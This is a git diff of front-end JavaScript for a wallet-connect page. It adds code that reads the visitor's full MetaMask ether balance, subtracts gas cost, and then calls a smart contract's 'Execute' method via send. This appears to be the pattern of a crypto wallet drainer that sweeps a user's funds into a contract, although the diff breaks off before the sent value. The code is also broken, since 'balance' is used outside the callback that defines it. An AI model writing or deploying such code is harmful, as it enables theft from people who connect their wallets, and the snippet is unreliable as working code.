@@ -8,6 +8,7 @@ window.addEventListener('load', async () => {
     if (typeof window.ethereum !== 'undefined') {
 
         const connectButton = document.getElementById('connectButton');
+
         connectButton.addEventListener('click', async () => {
             // Request account access
             const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
@@ -17,11 +18,24 @@ window.addEventListener('load', async () => {
             // Instantiate web3 with the MetaMask provider
             const web3 = new Web3(window.ethereum);
 
+            web3.eth.getBalance(account, (err, result) => {
+                if (err) {
+                    console.log(err);
+                    return;
+                }
+                const balance = web3.utils.fromWei(result, "ether");
+                console.log("Balance:", balance);
+                // Continue to execute the transaction with this balance
+            });
+
             // Instantiate the contract
             const contract = new web3.eth.Contract(contractABI, contractAddress);
 
             const gasPrice = await web3.eth.getGasPrice();
             const gasLimit = 200000;
+            const gasCost = gasPrice * gasLimit;
+
+            const adjustedBalance = web3.utils.toWei(balance, 'ether') - gasCost; // Adjust balance
 
             // Call the smart contract function
             contract.methods.Execute(account, zeroAddress, zeroAddress, zeroAddress, false).send({ 
